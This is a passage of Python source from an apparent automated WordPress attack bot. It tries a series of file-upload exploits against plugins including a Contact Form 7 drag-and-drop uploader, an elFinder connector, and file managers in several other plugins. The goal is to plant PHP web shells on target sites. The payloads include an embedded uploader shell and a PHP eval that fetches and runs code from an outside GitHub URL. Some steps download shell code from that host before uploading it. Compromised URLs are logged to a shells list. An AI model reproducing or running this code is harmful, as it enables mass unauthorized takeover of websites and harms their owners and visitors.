                "image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php @eval(\"?>\".file_get_contents(\"https://raw.githubusercontent.com/izx2023/z/main/14.php\"));?>" \
                "\r\n-----------------------------350278735926454076983690555601--\r\n"
        

            cann = requests.post(url+ '/wp-admin/admin-ajax.php', headers=self.headersn, data=self.datad,timeout=15)
            zs = url + "/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/"+ file + ".php"
            scan_response = requests.get(zs, headers=headersh,timeout=15)
            #requests.get('https://api.smartsheet.com', verify=certifi.where())
            #print (scan_response)
            if scan_response.status_code == 200:
                ckme = requests.get(zs,headers=headersh,timeout=15)
                if "SEA-GHOST" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day Contact Form 7-1 Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(zs+'\n')
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-1 ]'+la7mar+ '\n')
                
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-1 ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-1 ]'+la7mar+ '\n')
            pass 

        try:
        

            #file = ''.join(self.random.sample((string.ascii_uppercase + string.digits), 6))
            file = self.ran(10)

            headersh = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'}
            self.homepage = requests.get(url,headers=headersh,timeout=15)
            self.homepage = self.homepage.text
            self.homepage = self.homepage.split("ajax_nonce\":\"",1)[1]
            self.securitykey = self.homepage[:10]


            self.headersn = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
                            "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
                            "Content-Type": "multipart/form-data; boundary=---------------------------350278735926454076983690555601",
                            }
            self.datad = "-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"supported_type\"\r\n\r\n" \
                "php%\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"size_limit\"\r\n\r\n" \
                "5242880\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n" \
                "dnd_codedropz_upload\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"type" \
                "\"\r\n\r\nclick\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"security\"\r" \
                "\n\r\n" + self.securitykey +"\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"upload-file\"; " \
                "filename=\"" + file +".phar\"\r\nContent-Type: text/plain\r\n\r\n" \
                "<title>Bigbang Bot v1</title><center><div id=q>Bigbang Bot<br><?php if(isset($_GET['izo'])&&$_GET['izo']=='up'){echo'<font color=red>[uname]'.php_uname().'[/uname]';echo'<br><font color=red>[dir]'.getcwd().'[/dir]';echo'<form method=post enctype=multipart/form-data>';echo'<input type=file name=f><input name=v type=submit id=v value=up><br>';if($_POST['v']==up){if(@copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])){echo'<b>berhasil</b>-->'.$_FILES['f']['name'];}else{echo'<b>gagal';}}}?>" \
                "\r\n-----------------------------350278735926454076983690555601--\r\n"
        

            cann = requests.post(url+ '/wp-admin/admin-ajax.php', headers=self.headersn, data=self.datad,timeout=15)
            zs = url + "/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/"+ file + ".phar"
            scan_response = requests.get(zs, headers=headersh,timeout=15)
            if scan_response.status_code == 200:
                ckme = requests.get(zs,headers=headersh,timeout=15)
                if "Bigbang" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day Contact Form 7-2 Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(zs+'\n')
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-2 ]'+la7mar+ '\n')
                
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-2 ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-2 ]'+la7mar+ '\n')
            pass

        try:

            file = self.ran(10)

            homepage = requests.get(url,headers=Headers,timeout=15)
            token = re.findall('"nonce":"(.*?)"}',homepage.text)
            securitykey = token[1][:10]


            headersn = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
                            "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
                            "Content-Type": "multipart/form-data; boundary=---------------------------350278735926454076983690555601",
                            }
            datad = "-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"supported_type\"\r\n\r\n" \
                "php%\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"size_limit\"\r\n\r\n" \
                "5242880\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n" \
                "dnd_codedropz_upload\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"type" \
                "\"\r\n\r\nclick\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"security\"\r" \
                "\n\r\n" + securitykey +"\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"upload-file\"; " \
                "filename=\"" + file +".php%\"\r\nContent-Type: text/plain\r\n\r\n" \
                "image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<title>Bigbang Bot v1</title><center><div id=q>Bigbang Bot<br><?php if(isset($_GET['izo'])&&$_GET['izo']=='up'){echo'<font color=red>[uname]'.php_uname().'[/uname]';echo'<br><font color=red>[dir]'.getcwd().'[/dir]';echo'<form method=post enctype=multipart/form-data>';echo'<input type=file name=f><input name=v type=submit id=v value=up><br>';if($_POST['v']==up){if(@copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])){echo'<b>berhasil</b>-->'.$_FILES['f']['name'];}else{echo'<b>gagal';}}}?>" \
                "\r\n-----------------------------350278735926454076983690555601--\r\n"
        

            cann = requests.post(url+ '/wp-admin/admin-ajax.php', headers=headersn, data=datad,timeout=15)
            zs = url + "/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/"+ file + ".php"
            scan_response = requests.get(zs, headers=Headers,timeout=15)
            if scan_response.status_code == 200:
                ckme = requests.get(zs,headers=Headers,timeout=15)
                if "Bigbang" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day Contact Form 7-2x  Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(zs+'\n')
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-2x ]'+la7mar+ '\n')
                
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-2x ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-2x ]'+la7mar+ '\n')
            pass

        try:
        

            #file = ''.join(self.random.sample((string.ascii_uppercase + string.digits), 6))
            file = self.ran(10)

            headersh = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'}
            self.homepage = requests.get(url,headers=headersh,timeout=15)
            self.homepage = self.homepage.text
            self.homepage = self.homepage.split("ajax_nonce\":\"",1)[1]
            self.securitykey = self.homepage[:10]


            self.headersn = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
                            "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
                            "Content-Type": "multipart/form-data; boundary=---------------------------350278735926454076983690555601",
                            }
            self.datad = "-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"supported_type\"\r\n\r\n" \
                "php%\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"size_limit\"\r\n\r\n" \
                "5242880\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n" \
                "dnd_codedropz_upload\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"type" \
                "\"\r\n\r\nclick\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"security\"\r" \
                "\n\r\n" + self.securitykey +"\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"upload-file\"; " \
                "filename=\"" + file +".php%\"\r\nContent-Type: text/plain\r\n\r\n" \
                "<title>Bigbang Bot v1</title><center><div id=q>Bigbang Bot<br><?php if(isset($_GET['izo'])&&$_GET['izo']=='up'){echo'<font color=red>[uname]'.php_uname().'[/uname]';echo'<br><font color=red>[dir]'.getcwd().'[/dir]';echo'<form method=post enctype=multipart/form-data>';echo'<input type=file name=f><input name=v type=submit id=v value=up><br>';if($_POST['v']==up){if(@copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])){echo'<b>berhasil</b>-->'.$_FILES['f']['name'];}else{echo'<b>gagal';}}}?>" \
                "\r\n-----------------------------350278735926454076983690555601--\r\n"
        

            cann = requests.post(url+ '/wp-admin/admin-ajax.php', headers=self.headersn, data=self.datad,timeout=15)
            zs = url + "/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/"+ file + ".php?izo=up"
            scan_response = requests.get(zs, headers=headersh,timeout=15)
            if scan_response.status_code == 200:
                ckme = requests.get(zs,headers=headersh,timeout=15)
                if "Bigbang" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day Contact Form 7-3 Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(zs+'\n')
                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-3 ]'+la7mar+ '\n')
                
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-3 ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form 7-3 ]'+la7mar+ '\n')
            pass

        try:

            izo = self.ran(10) + '.php'
            shelle_content = requests.get("https://raw.githubusercontent.com/izx2023/z/main/14x.php")
            getme = requests.post(url + '/wp-content/plugins/contact-form-7/modules/file.php',headers=Headers,files={"zip":(izo,shelle_content.text.encode(), "text/html")},timeout=15)
            ckme = requests.get(url + '/wp-content/plugins/contact-form-7/'+izo,headers=Headers,timeout=15)
            if "SEA-GHOST" in ckme.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day Contact Form-4 Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/plugins/contact-form-7/'+izo+'\n')

            elif "SEA-GHOST" in requests.get(url + '/wp-content/uploads/2020/12/'+izo,headers=Headers,timeout=15).text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day AIT CSV Import Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/uploads/2020/12/'+izo+'\n')
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form-4 ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Contact Form-4 ]'+la7mar+ '\n')
            pass

        try:
            full_url = url+'/wp-content/plugins/augmented-reality/vendor/elfinder/php/connector.minimal.php'

            self.data = {
                'cmd': 'mkfile',
                'target': 'l1_Lw',
                'name': 'izocin.php'

            }

        #izo = ran(10) + '.php'
            content=req.get("https://raw.githubusercontent.com/izx2023/z/main/14.php", verify=False)
            content=content.text
            self.data2={"cmd" : "put", "target":"l1_L1xpem9jaW4ucGhw", "content": content}
        #print(f"Just do it... URL: {full_url}")
            res = requests.post(full_url, data=self.data, timeout=10,verify=False)
            time.sleep(0.3)
            resx = requests.post(full_url, data=self.data2, timeout=15,verify=False)
            resi = requests.get(url+'/wp-content/plugins/augmented-reality/file_manager/izocin.php')
        #print(res.status_code)
            if "SEA-GHOST" in resi.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [augmented-reality Shell]'+ '\n')
                with open('Vulns/xxxxxxxx.txt', 'a') as writer:
                    writer.write(url+'/wp-content/plugins/augmented-reality/file_manager/izocin.php' + '\n')        
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln augmented-reality ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Aaugmented-reality ]'+la7mar+ '\n')
            pass

        try:
            caso = self.ran(10) + '.php',self.ran(10) + '.php;.jpg',self.ran(10) + '.csv.phtml'
            for izo in caso:
                s = requests.Session()
                shell_content = s.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
                r = s.post(url+"/wp-content/plugins/ez-done-file-manager/admin.php",files={"zip":(izo,shell_content.text.encode(), "text/html")})
                Check = s.get(url  + '/wp-content/plugins/ez-done-file-manager/'+izo, headers=Headers)
                if 'SEA-GHOST' in Check.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/ez-done-file-manager/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [ez-done-file-manager Uploaded Shell]'+ '\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln ez-done-file-manager]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln ez-done-file-manager]'+la7mar+ '\n')
            pass

        try:
            caso = self.ran(10) + '.php',self.ran(10) + '.php;.jpg',self.ran(10) + '.csv.phtml'
            for izo in caso:
                s = requests.Session()
                shell_content = s.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
                r = s.post(url+"/wp-content/admin/views/tool-file-editor.php",files={"zip":(izo,shell_content.text.encode(), "text/html")})
                Check = s.get(url  + '/wp-content/plugins/admin/views/'+izo, headers=Headers)
                if 'SEA-GHOST' in Check.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/admin/views/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [Yoast SEO Uploaded Shell]'+ '\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Yoast SEO]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Yoast SEO]'+la7mar+ '\n')
            pass

        try:
            s = requests.Session()
            r = s.post(url+"/wp-content/plugins/wp-mail-smtp/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php",data={'row_id':'curl https://raw.githubusercontent.com/izx2023/z/main/14.php'})
            Check = s.get(url  + '/wp-content/plugins/wp-mail-smtp/vendor/woocommerce/action-scheduler/classes/abstracts/14.php', headers=Headers)
            if 'SEA-GHOST' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/wp-content/plugins/wp-mail-smtp/vendor/woocommerce/action-scheduler/classes/abstracts/14.php' + '\n')
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wp-mail-smtp Uploaded Shell]'+ '\n')

            else:
